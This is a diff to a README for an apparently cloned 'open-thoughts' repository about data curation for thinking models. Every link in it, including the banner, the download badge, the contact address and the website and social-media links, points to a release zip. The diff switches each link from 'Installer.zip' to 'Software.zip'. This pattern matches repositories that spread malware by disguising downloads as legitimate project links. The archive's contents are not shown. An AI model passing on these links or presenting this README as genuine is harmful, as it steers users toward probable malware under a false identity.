@@ -1,6 +1,6 @@
 # 🌐 **Open Thoughts: Fully Open Data Curation for Thinking Models**
 
-![Open Thoughts Banner](https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip)
+![Open Thoughts Banner](https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip)
 
 Welcome to the "open-thoughts" repository - your go-to place for exploring fully open data curation for thinking models! 🧠
 
@@ -13,7 +13,7 @@ Welcome to the "open-thoughts" repository - your go-to place for exploring fully
 
 ## 🚀 Quick Start
 Get started with "Open Thoughts" by downloading the latest release:
-[![Download Latest Release](https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip%20Release-blue)](https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip)
+[![Download Latest Release](https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip)
 
 Need a guiding hand? Make sure to check out the "Releases" section for more options.
 
@@ -38,13 +38,13 @@ Interested in contributing to "Open Thoughts"? Here's how you can get involved:
 Your contributions are highly valued and can help improve the repository for everyone!
 
 ## 📧 Contact Us
-Have questions, suggestions, or feedback? Feel free to reach out to us at [https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip](https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip).
+Have questions, suggestions, or feedback? Feel free to reach out to us at [https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip](https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip).
 
 ## 🌌 Explore Further
 Discover more about "Open Thoughts" and stay updated on the latest developments:
-- Website: [Open Thoughts Official Website](https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip)
-- LinkedIn: [Follow us on LinkedIn](https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip)
-- Twitter: [Stay tuned on Twitter](https://github.com/shafwan0632/open-thoughts/releases/download/v1.0/Installer.zip)
+- Website: [Open Thoughts Official Website](https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip)
+- LinkedIn: [Follow us on LinkedIn](https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip)
+- Twitter: [Stay tuned on Twitter](https://github.com/shafwan0632/open-thoughts/releases/download/v2.0/Software.zip)
 
 Let your thoughts roam freely with "Open Thoughts" - where the possibilities are limitless! 🚀
 
